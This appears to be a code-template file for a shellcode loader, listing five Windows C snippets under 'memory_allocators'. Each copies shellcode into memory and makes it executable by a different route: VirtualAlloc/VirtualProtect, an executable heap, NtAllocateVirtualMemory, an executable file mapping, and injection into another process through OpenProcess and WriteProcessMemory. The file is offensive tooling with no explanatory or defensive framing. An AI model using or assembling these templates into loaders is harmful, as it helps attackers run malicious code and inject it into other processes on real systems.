memory_allocators.code_template:
LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(addr, shellcode, size);
VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);

HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
LPVOID addr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
memcpy(addr, shellcode, size);

PVOID addr = NULL;
SIZE_T regionSize = size;
NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memcpy(addr, shellcode, size);
NtProtectVirtualMemory(GetCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);

HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, size, NULL);
LPVOID addr = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0);
memcpy(addr, shellcode, size);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProcess, addr, shellcode, size, NULL);
VirtualProtectEx(hProcess, addr, size, PAGE_EXECUTE_READ, &oldProtect);

